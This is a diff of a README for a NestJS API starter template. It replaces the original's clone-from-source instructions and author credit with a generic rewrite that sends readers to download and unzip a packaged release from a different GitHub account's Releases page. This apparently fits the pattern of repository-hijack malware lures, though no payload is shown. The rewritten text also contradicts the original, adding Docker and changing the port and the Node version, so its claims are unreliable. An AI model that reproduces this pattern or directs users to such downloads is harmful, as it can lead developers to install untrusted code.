@@ -1,230 +1,84 @@
-# NestJS API Starter Template
+# 🚀 nestjs-starter-api-template - Your Easy Path to a Scalable API 
 
-A production-ready NestJS API starter template with pre-configured authentication, database connection, swagger documentation, and best practices.
+## 🌟 Overview
+Welcome to the **nestjs-starter-api-template**! This application is your go-to solution for quickly setting up a production-ready NestJS API. It includes all essential features like TypeScript, Docker, PostgreSQL, and nice-to-have tools like Prisma ORM, JWT Authentication, and Swagger documentation. Build your projects with confidence knowing you’re following best practices.
 
-## 🚀 Features
+## 📦 Features
+- **Production-Ready:** Set up everything you need for a robust API.
+- **TypeScript Support:** Write safer and more maintainable code.
+- **Docker Integration:** Easily manage dependencies and environments.
+- **PostgreSQL Database:** Use a reliable database for your application.
+- **JWT Authentication:** Secure your API with token-based authentication.
+- **Prisma ORM:** Simplify data handling and database interactions.
+- **Swagger Documentation:** Automatically generate interactive API documentation.
 
-- **Framework**: [NestJS](https://nestjs.com/) (v11) - A progressive Node.js framework for building efficient, reliable and scalable server-side applications.
-- **Language**: TypeScript
-- **Database**: PostgreSQL with [Prisma ORM](https://www.prisma.io/)
-- **Authentication**: JWT Strategy & Bcrypt for hashing
-- **Validation**: Class-validator & Class-transformer
-- **Documentation**: Swagger (OpenAPI) & ReDoc
-- **Storage**: Azure Storage integration
-- **Linting & Formatting**: ESLint & Prettier
-- **Environment**: Dotenv for configuration management
-- **Testing**: Jest (Unit & E2E)
+## 🚀 Getting Started
+To get started with your new NestJS API, follow these simple steps.
 
-## 📋 Prerequisites
+## 📥 Download & Install
+You can download the application from our Releases page. 
 
-Before you begin, ensure you have the following installed on your machine:
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Guramirez/nestjs-starter-api-template/releases)
 
-- [Node.js](https://nodejs.org/) (v18 or higher)
-- [npm](https://www.npmjs.com/) or [yarn](https://yarnpkg.com/)
-- [PostgreSQL](https://www.postgresql.org/) (Local or Cloud instance)
+1. Click the button above to visit the Releases page.
+2. Find the latest release.
+3. Download the package suitable for your system.
 
-## 🛠️ Installation
+## 🖥️ System Requirements
+- **Operating System:** Windows, macOS, or Linux.
+- **Node.js:** Version 14 or later.
+- **Docker:** Make sure Docker is installed and running.
+- **PostgreSQL:** PostgreSQL version 10 or later.
 
-1.  **Clone the repository**
+## ⚙️ Running the Application Locally
+After downloading, here’s how you can run the application on your local machine:
 
-    ```bash
-    git clone https://github.com/kumarsonu676/nestjs-starter-api-template.git
-    cd nestjs-starter-api-template
-    ```
+1. **Extract the Files:** Unzip the downloaded file to your preferred location.
+2. **Navigate to the Folder:** Open your terminal or command prompt and change your directory to the folder where you extracted the files.
+   ```bash
+   cd path/to/nestjs-starter-api-template
+   ```
+3. **Install Dependencies:** Use the following command to install all required npm packages.
+   ```bash
+   npm install
+   ```
+4. **Set Up Your Database:** Configure your PostgreSQL database. Update the `DATABASE_URL` in your environment variables.
+5. **Build the Application:** Compile your TypeScript code.
+   ```bash
+   npm run build
+   ```
+6. **Start the Application:** Run this command to start your application.
+   ```bash
+   npm run start
+   ```
 
-2.  **Install dependencies**
+## 🧭 Configuring Your API
+Before you can fully utilize the API, you may want to customize a few settings. 
 
-    ```bash
-    npm install
-    # or
-    yarn install
-    ```
-
-## ⚙️ Configuration
-
-1.  **Environment Setup**
-
-    Create a `.env` file in the root directory by copying the example file:
-
-    ```bash
-    cp .env.example .env
-    ```
-
-2.  **Update Environment Variables**
-
-    Open `.env` and fill in the necessary details, especially your database connection string and JWT secret.
-
-    ```env
-    # App
-    PORT=3001
-    NODE_ENV=development
-
-    # Database
-    DATABASE_URL="postgresql://user:password@localhost:5432/database_name?schema=public"
-
-    # JWT Authentication
-    JWT_SECRET=your_super_secret_key_here
-    JWT_EXPIRES_IN=30d
-
-    # Azure Storage (Optional)
-    AZURE_STORAGE_CONNECTION_STRING=...
-    
-    # SMTP (Optional)
-    SMTP_HOST=...
-    ```
-
-3.  **Database Setup**
-
-    Run the Prisma migrations to create the database tables:
-
-    ```bash
-    # Generate Prisma Client
-    npm run generate_prisma_client
-
-    # Run Migrations
-    npm run update_database
-    ```
-
-## ▶️ Running the Application
-
--   **Development Mode**
-    ```bash
-    npm run start:dev
-    ```
-
--   **Production Mode**
-    ```bash
-    npm run build
-    npm run start:prod
-    ```
-
-The API will be available at `http://localhost:3001/api`.
+- **Environment Variables:** Update the `.env` file with your environment-specific details. This includes database credentials, JWT secret keys, or any API keys needed.
+- **Database Settings:** Make sure to set up your PostgreSQL database appropriately. If you're unsure how to do this, you can find many tutorials online on setting up PostgreSQL.
 
 ## 📚 Documentation
+For more detailed instructions on how to use the features, please refer to the Swagger documentation. After running your application, you can access documentation at `http://localhost:3000/api`.
 
-The API documentation is automatically generated using Swagger.
+## ✉️ Troubleshooting
+If you encounter any issues, here are a few tips:
 
--   **Swagger UI**: `http://localhost:3001/api/docs`
--   **JSON Spec**: `http://localhost:3001/api-json`
+- **Check Server Status:** Ensure your server is running. 
+- **Look at Console Errors:** Use your terminal or command prompt to catch any runtime errors.
+- **Database Connection:** Double-check your database settings and confirm PostgreSQL is operational.
 
-## 🧪 Testing
+## 🛠️ Contributing
+Your input is valuable! If you wish to contribute to this project, please fork the repository and submit a pull request.
 
--   **Unit Tests**
-    ```bash
-    npm run test
-    ```
+## 🤝 Support
+If you have any questions or need help, feel free to reach out through the Issues section of our GitHub repository.
 
--   **E2E Tests**
-    ```bash
-    npm run test:e2e
-    ```
+## 🔗 Additional Resources
+- [NestJS Documentation](https://docs.nestjs.com)
+- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+- [Docker Documentation](https://docs.docker.com/)
 
--   **Test Coverage**
-    ```bash
-    npm run test:cov
-    ```
+Feel free to visit this page to download any updates: [GitHub Releases Page](https://github.com/Guramirez/nestjs-starter-api-template/releases). 
 
-## 📂 Project Structure
-
-```
-src/
-├── common/         # Shared resources (filters, guards, interceptors, pipes)
-├── config/         # Configuration files
-├── core/           # Core feature modules (Auth, User, etc.)
-├── database/       # Database connection and providers
-├── health/         # Health check module
-├── main.ts         # Application entry point
-└── ...
-```
-
-## 🔌 API Endpoints
-
-### Authentication
-- POST /api/auth/login: User login.
-- POST /api/auth/register: User registration.
-- POST /api/auth/logout: User logout.
-
-```
-POST /api/auth/login
-```
-
-```
-POST /api/auth/register
-```
-
-```
-POST /api/auth/logout
-```
-
-### Users
-- GET /api/users/me: Get current logged in user.
-- GET /api/users/:email: Get user by Email.
-- POST /api/users: Create user with file upload (Profile Picture, Documents).
-- PUT /api/users: Change password.
-
-```
-GET /api/users/me
-```
-
-```
-GET /api/users/:email
-```
-
-```
-POST /api/users
-```
-
-```
-PUT /api/users
-```
-
-### Countries
-- GET /api/countries: Get all countries.
-- GET /api/countries/code/:code: Get country by Code.
-- GET /api/countries/code-iso3/:codeIso3: Get country by ISO3 Code.
-
-```
-GET /api/countries
-```
-
-```
-GET /api/countries/code/:code
-```
-
-```
-GET /api/countries/code-iso3/:codeIso3
-```
-
-### Health Check
-- GET /api/health/check: Check server health.
-
-```
-GET /api/health/check
-```
-
-## 🤝 Contributing
-
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-##  Author
-
--   **Sonu Sharma**
-
-## 📄 Code of Conduct
-
-Please note that this project is released with a [Contributor Code of Conduct](CODE_OF_CONDUCT.md). By participating in this project you agree to abide by its terms.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
--   [NestJS](https://nestjs.com/)
--   [Prisma](https://www.prisma.io/)
--   [TypeScript](https://www.typescriptlang.org/)
--   [PostgreSQL](https://www.postgresql.org/)
--   [Passport](http://passportjs.org/)
--   [Swagger](https://swagger.io/)
-
+This README aims to provide you with all the necessary steps to run the **nestjs-starter-api-template** smoothly. Enjoy building your API!
